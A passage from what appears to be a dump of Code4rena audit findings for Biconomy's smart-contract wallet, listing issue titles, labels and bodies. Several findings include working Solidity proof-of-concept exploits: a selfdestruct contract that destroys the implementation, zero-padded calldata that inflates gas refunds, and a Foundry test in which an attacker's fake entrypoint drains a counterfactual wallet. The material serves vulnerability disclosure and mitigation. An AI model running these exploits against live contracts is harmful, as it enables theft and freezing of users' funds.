should return a time range, as per the EIP specifications:  ```text The return value is packed of sigFailure, validUntil and validAfter timestamps.   - sigFailure is 1 byte value of \u201c1\u201d the signature check failed (should not revert on signature failure, to support estimate)   - validUntil is 8-byte timestamp value, or zero for \u201cinfinite\u201d. The UserOp is valid only up to this time.   - validAfter is 8-byte timestamp. The UserOp is valid only after this time. ```  This isn't the case. It just returns a signature deadline validity, which would probably be here the `validUntil` value.  ### Aggregator  This part deals with the aggregator interfacing:  ```text validateUserOp() (inherited from IAccount interface) MUST verify the aggregator parameter is valid and the same as getAggregator  ...  The account should also support aggregator-specific getter (e.g. getAggregationInfo()). This method should export the account\u2019s public-key to the aggregator, and possibly more info (note that it is not called directly by the entryPoint)  ...  If an account uses an aggregator (returns it with getAggregator()), then its address is returned by simulateValidation() reverting with ValidationResultWithAggregator instead of ValidationResult ```  This aggregator address validation is not [done](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68).  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Refactor the code that is not compliant with the EIP"}, {"title": "Destruction of the `SmartAccount` implementation", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/496", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L192 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L229 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23   # Vulnerability details  ## Description  If the `SmartAccount` implementation contract is not initialized, it can be destroyed using the following attack scenario:  - Initialize the `SmartAccount` **implementation** contract using the `init` function. - Execute a transaction that contains a single `delegatecall` to a contract that executes the `selfdestruct` opcode on any incoming call, such as:  ```solidity= contract Destructor {     fallback() external {         selfdestruct(payable(0));     } } ```  The destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as the `Singleton` functionality and the entire contract would be destroyed, leaving only the functionality from the Proxy contract accessible.  ---  In the deploy script there is the following logic:  ```typescript const SmartWallet = await ethers.getContractFactory(\"SmartAccount\"); const baseImpl = await SmartWallet.deploy(); await baseImpl.deployed(); console.log(\"base wallet impl deployed at: \", baseImpl.address); ```  So, in the deploy script there is no enforce that the `SmartAccount` contract implementation was initialized.  The same situation in `scw-contracts/scripts/wallet-factory.deploy.ts` script.  ---  Please note, that in case only the possibility of initialization of the `SmartAccount` implementation will be banned it will be possible to use this attack. This is so because in such a case `owner` variable will be equal to zero and it will be easy to pass a check inside of `checkSignatures` function using the fact that for incorrect input parameters `ecrecover` returns a zero address.  ## Impact  Complete freezing of all functionality of all wallets (including complete funds freezing).  ## Recommended Mitigation Steps  Add to the deploy script initialization of the `SmartAccount` implementation, or add to the `SmartAccount` contract the following constructor that will prevent implementation contract from the initialization:  ```solidity= // Constructor ensures that this implementation contract can not be initialized constructor() public {     owner = address(1); } ```"}, {"title": "Theft of funds under relaying the transaction", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/489", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L248   # Vulnerability details  ## Description  The `execTransaction` function is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, the `startGas` value is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of `21000` gas and the cost per calldata byte of `msg.data.length * 8` gas. At the end of the function, the total consumed gas is calculated as `gasleft() - startGas` and the appropriate refund is sent to the relayer.  An attacker could manipulate the calldata to increase the refund amount while spending less gas than what is calculated by the contract. To do this, the attacker could provide calldata with zero padded bytes of arbitrary length. This would only cost 4 gas per zero byte, but the refund would be calculated as 8 gas per calldata byte. As a result, the refund amount would be higher than the gas amount spent by the relayer.  ### Attack scenario  Let\u2019s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to the `SmartAccount` contract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end.  So, the original transaction has such calldata:  ```sol= abi.encodeWithSignature(RelayerManager.execute.selector, (...)) ```  The modified (frontrun) transaction calldata:  ```sol= // Basically, just add zero bytes at the end abi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[] ```  ### PoC  The PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100_000 meaningless zeroes bytes, that gives a `100_000 * 4 = 400_000` additional gas refund. Technically, it is possible to pass even more zero bytes.  ```solidity= pragma solidity ^0.8.12;  contract DummySmartWallet {     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) external {         // Do nothing, just test that data with appended zero bytes are accepted by Solidity     } }  contract PoC {     address immutable smartWallet;      constructor() {         smartWallet = address(new DummySmartWallet());     }      // Successfully call with original data     function testWithOriginalData() external {         bytes memory txCalldata = _getOriginalTxCalldata();          (bool success, ) = smartWallet.call(txCalldata);         require(success);     }      // Successfully call with original data + padded zero bytes     function testWithModifiedData() external {         bytes memory originalTxCalldata = _getOriginalTxCalldata();         bytes memory zeroBytes = new bytes(100000);          bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);          (bool success, ) = smartWallet.call(txCalldata);         require(success);     }      function _getOriginalTxCalldata() internal pure returns(bytes memory) {         Transaction memory transaction;         FeeRefund memory refundInfo;         bytes memory signatures;         return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);     } } ```  ## Impact  An attacker to manipulate the gas refund amount to be higher than the gas amount spent, potentially leading to arbitrary big ether loses by a smart wallet.  ## Recommended Mitigation Steps  You can calculate the number of bytes used by the relayer as a sum per input parameter. Then an attacker won't have the advantage of providing non-standard ABI encoding for the PoC calldata.   ``` // Sum the length of each  bynamic and static length parameters. uint256 expectedNumberOfBytes = _tx.data.length + signatures.length + 12 * 32; uint256 dataLen = Math.min(msg.data.length, expectedNumberOfBytes); ```  Please note, the length of the `signature` must also be bounded to eliminate the possibility to put meaningless zeroes there."}, {"title": "Cross-Chain Signature Replay Attack", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/466", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90   # Vulnerability details  # Cross-Chain Signature Replay Attack  ## Impact User operations can be replayed on smart accounts accross different chains. This can lead to user's loosing funds or any unexpected behaviour that transaction replay attacks usually lead to.  ## Proof of Concept As specified by the [EIP4337](https://eips.ethereum.org/EIPS/eip-4337) standard `to prevent replay attacks ... the signature should depend on chainid`. In [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90) the chainId is missing which means that the same UserOperation can be replayed on a different chain for the same smart contract account if the `verifyingSigner` is the same (and most likely this will be the case).  ## Tools Used Manual review  ## Recommended Mitigation Steps Add the chainId in the calculation of the UserOperation hash in [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90)  ```     function getHash(UserOperation calldata userOp)     public view returns (bytes32) { // @audit change to view         //can't use userOp.hash(), since it contains also the paymasterAndData itself.         return keccak256(abi.encode(                 userOp.getSender(),                 userOp.nonce,                 keccak256(userOp.initCode),                 keccak256(userOp.callData),                 userOp.callGasLimit,                 userOp.verificationGasLimit,                 userOp.preVerificationGas,                 userOp.maxFeePerGas,                 userOp.maxPriorityFeePerGas   block.chainid // @audit add chain id             ));     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/465", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-07"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0x1f8b-Q.md)."}, {"title": "Attacker can gain control of counterfactual wallet", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/460", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45   # Vulnerability details  A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.  However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45  ```solidity function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){     bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));     bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));     // solhint-disable-next-line no-inline-assembly     assembly {         proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)     }     require(address(proxy) != address(0), \"Create2 call failed\");     // EOA + Version tracking     emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);     BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);     isAccountExist[proxy] = true; } ```  As the entrypoint address doesn't take any role in the address generation (it isn't part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.  ## Impact  After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using `delegatecall`) using the `execFromEntryPoint` function:  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492  ```solidity function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {             success = execute(dest, value, func, operation, gasLimit);     require(success, \"Userop Failed\"); } ```  This means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.  ## PoC  In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet.  ```solidity contract StealEntryPoint {     function steal(SmartAccount wallet) public {         uint256 balance = address(wallet).balance;          wallet.execFromEntryPoint(             msg.sender, // address dest             balance, // uint value             \"\", // bytes calldata func             Enum.Operation.Call, // Enum.Operation operation             gasleft() // uint256 gasLimit         );     } }  contract AuditTest is Test {     bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;      uint256 bobPrivateKey = 0x123;     uint256 attackerPrivateKey = 0x456;      address deployer;     address bob;     address attacker;     address entrypoint;     address handler;      SmartAccount public implementation;     SmartAccountFactory public factory;     MockToken public token;      function setUp() public {         deployer = makeAddr(\"deployer\");         bob = vm.addr(bobPrivateKey);         attacker = vm.addr(attackerPrivateKey);         entrypoint = makeAddr(\"entrypoint\");         handler = makeAddr(\"handler\");          vm.label(deployer, \"deployer\");         vm.label(bob, \"bob\");         vm.label(attacker, \"attacker\");          vm.startPrank(deployer);         implementation = new SmartAccount();         factory = new SmartAccountFactory(address(implementation));         token = new MockToken();         vm.stopPrank();     }          function test_SmartAccountFactory_StealCounterfactualWallet() public {         uint256 index = 0;         address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);         // Simulate Bob sends 1 ETH to the wallet         uint256 amount = 1 ether;         vm.deal(counterfactualWallet, amount);          // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)         vm.startPrank(attacker);          StealEntryPoint stealer = new StealEntryPoint();          address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);         SmartAccount wallet = SmartAccount(payable(proxy));          // address is the same         assertEq(address(wallet), counterfactualWallet);          // trigger attack         stealer.steal(wallet);          vm.stopPrank();          // Attacker has stolen the funds         assertEq(address(wallet).balance, 0);         assertEq(attacker.balance, amount);     } } ```  ## Recommendation  This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/450", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-09"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/joestakey-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/448", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-03"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Aymen0909-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/446", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-04"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0x1f8b-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/438", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-10"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/betweenETHlines-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/436", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-05"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/lukris02-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/435", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-06"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Secureverse-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/434", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-07"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xSmartContract-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/423", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-08"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Udsen-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/417", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Kalzak-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/409", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-13"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Josiah-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/402", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-14"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Viktor_Cortess-Q.md)."}, {"title": "methods used by EntryPoint has `onlyOwner` modifier", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/390", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460-L461 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465-L466   # Vulnerability details  ## Description `execute` and `executeBatch` in `SmartAccount.sol` can only be called by owner, not EntryPoint:  ```javascript File: SmartAccount.sol  460:    function execute(address dest, uint value, bytes calldata func) external onlyOwner{ 461:        _requireFromEntryPointOrOwner(); 462:        _call(dest, value, func); 463:    } 464: 465:    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{ 466:        _requireFromEntryPointOrOwner(); 467:        require(dest.length == func.length, \"wrong array lengths\"); 468:        for (uint i = 0; i < dest.length;) { 469:            _call(dest[i], 0, func[i]); 470:            unchecked { 471:                ++i; 472:            } 473:        } 474:    } ```  From [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337):  > - **Call the account with the `UserOperation`\u2019s calldata.** It\u2019s up to the account to choose how to parse the calldata; an expected workflow is for the account to have an execute function that parses the remaining calldata as a series of one or more calls that the account should make.  ## Impact This breaks the interaction with EntryPoint  ## Proof of Concept The reference implementation has both these functions without any onlyOwner modifiers:  https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/samples/SimpleAccount.sol#L56-L73 ```javascript 56:    /** 57:     * execute a transaction (called directly from owner, not by entryPoint) 58:     */ 59:    function execute(address dest, uint256 value, bytes calldata func) external { 60:        _requireFromEntryPointOrOwner(); 61:        _call(dest, value, func); 62:    } 63: 64:    /** 65:     * execute a sequence of transaction 66:     */ 67:    function executeBatch(address[] calldata dest, bytes[] calldata func) external { 68:        _requireFromEntryPointOrOwner(); 69:        require(dest.length == func.length, \"wrong array lengths\"); 70:        for (uint256 i = 0; i < dest.length; i++) { 71:            _call(dest[i], 0, func[i]); 72:        } 73:    } ```  ## Tools Used vscode  ## Recommended Mitigation Steps Remove `onlyOwner` modifier from `execute` and `executeBatch`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/380", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-15"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/peanuts-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/378", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-08"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rickard-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/366", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-09"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/gz627-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/365", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-16"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/gz627-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/362", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-17"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/IllIllI-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/361", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-10"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/IllIllI-G.md)."}, {"title": "User can bypass the sponsored tx policy and can possibly drain paymaster's deposit with transaction withold attack", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/360", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-18"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L91   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  ## Proof of Concept  for example, biconomy's wallet policy is - 1 eth for each wallet daily  and attacker does this - create userOp that spends 1 eth for gas - biconomy signs for that tx - attacker does not broadcast the tx and just withholds the signature - attacker creates another tx that spends 1 eth for gas - biconomy does check mainnet and finds out attack haven't spend any gas today so signs the tx - attacker broadcasts both tx(first one and the second one) - attacker spends 2 eth for gas in 1day  ## Tools Used  Contacting livingrock through discord  ## Recommended Mitigation Steps  use nonce per user in paymaster and use that to encode hash ``` contract VerifyingSingletonPaymaster is BasePaymaster {      using ECDSA for bytes32;     // possibly //  using Signatures for UserOperation;     using UserOperationLib for UserOperation;     using PaymasterHelpers for UserOperation;     using PaymasterHelpers for bytes;     using PaymasterHelpers for PaymasterData;      mapping(address => uint256) public paymasterIdBalances;     mapping(address => uint256) public senderNonce;     ...     function getHash(UserOperation calldata userOp)     public pure returns (bytes32) {         //can't use userOp.hash(), since it contains also the paymasterAndData itself.         address sender = userOp.getSender();         return keccak256(abi.encode(                 sender,                 userOp.nonce,                 keccak256(userOp.initCode),                 keccak256(userOp.callData),                 userOp.callGasLimit,                 userOp.verificationGasLimit,                 userOp.preVerificationGas,                 userOp.maxFeePerGas,                 userOp.maxPriorityFeePerGas,                 senderNonce[sender]             ));     } ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/353", "labels": ["bug", "grade-b", "judge review requested", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-19"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/cryptostellar5-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/336", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-20"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Lirios-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/311", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-11"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/cthulhu_cult-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/308", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-22"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Diana-Q.md)."}, {"title": "DoS of user operations and loss of user transaction fee due to insufficient gas value submission by malicious bundler", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/303", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L68-L86 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L168-L190   # Vulnerability details  ## Impact An attacker (e.g. a malicious bundler) could submit a bundle of high gas usage user operations with insufficient gas value, causing the bundle to fail even when the users calculated the gas limits correctly. This will result in a DoS for the user and the user/paymaster still have to pay for the execution, potentially draining their funds. This attack is possible as user operations are included by bundlers from the UserOperation mempool into the Ethereum block (see post on ERC-4337 https://medium.com/infinitism/erc-4337-account-abstraction-without-ethereum-protocol-changes-d75c9d94dc4a).  Reference for this issue: https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef  ## Proof of Concept In innerHandleOp(), a call was made to handle the operation with the specified mUserOp.callGasLimit. However, a malicious bundler could call the innerHandleOp() via handleOps() with a gas value that is insufficient for the transactions, resulting in the call to fail.   The remaining gas amount (e.g. gasLeft()) at this point was not verified to ensure that it is more than enough to fulfill the specified mUserOp.callGasLimit for the user operation. Even though the operation failed, the user/payment will still pay for the transactions due to the post operation logic.   https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L176   (bool success,bytes memory result) = address(mUserOp.sender).call{gas : mUserOp.callGasLimit}(callData);  ## Tools Used  ## Recommended Mitigation Steps Update the Account Abstraction implementation to the latest version. This will update the innerHandleOp() to verify that remaining gas is more than sufficient to cover the specified mUserOp.callGasLimit and mUserOp.verificationGasLimit.   Reference: https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/291", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-24"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Atarpara-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/290", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-25"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/horsefacts-Q.md)."}, {"title": "Doesn't Follow ERC1271 Standard", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/288", "labels": ["bug", "2 (Med Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L6 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L19 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   # Vulnerability details  ## Impact  As Per [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard `ERC1271_MAGIC_VAULE` should be `0x1626ba7e` instead of `0x20c13b0b` and function name should be `isValidSignature(bytes32,bytes)` instead of  `isValidSignature(bytes,bytes)`. Due to this, signature verifier contract go fallback function and return unexpected value and never return `ERC1271_MAGIC_VALUE` and always revert `execTransaction` function.   ## Proof of Concept  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L6  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L19  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   ## Tools Used Manual Review  ## Recommended Mitigation Steps Follow [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/277", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-12"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report 